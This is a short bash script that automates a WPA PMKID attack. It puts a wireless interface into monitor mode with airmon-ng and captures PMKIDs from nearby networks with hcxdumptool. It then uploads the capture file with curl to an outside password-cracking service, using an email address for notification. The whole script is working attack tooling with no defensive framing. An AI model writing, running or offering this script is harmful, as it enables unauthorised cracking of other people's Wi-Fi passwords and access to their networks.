#!/bin/bash
clear
ifconfig
read -p "Enter interface:" in
read -p "Enter path to save (full) file:" path
airmon-ng check kill
airmon-ng start $in
echo "Please wait 8-10 minutes to capture PMKIDs and then press ^C"
echo "Starting hcxdumptool ..."
sleep 2
hcxdumptool -o $path -i $in""mon --enable_status 15
read -p "Enter your mail for notification:" email
echo "Restarting network-manager..."
airmon-ng stop $in""mon
service network-manager restart
sleep 10
echo "Sending file to https://onlinehashcrack.com..."
curl -X POST -F "email="$email -F "file=@"$path  https://api.onlinehashcrack.com
echo "Done"
exit
